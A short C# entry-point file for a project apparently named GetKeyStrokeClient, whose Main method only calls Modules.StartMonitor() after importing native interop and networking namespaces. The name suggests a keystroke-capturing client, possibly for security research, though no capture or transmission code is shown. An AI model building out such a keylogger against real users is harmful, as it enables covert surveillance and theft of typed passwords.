using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using GetKeyStrokeClient.Interop;
using GetKeyStrokeClient.Library;

namespace GetKeyStrokeClient
{
    using NTSTATUS = Int32;

    internal class GetKeyStrokeClient
    {
        static void Main()
        {
            Modules.StartMonitor();
        }
    }
}
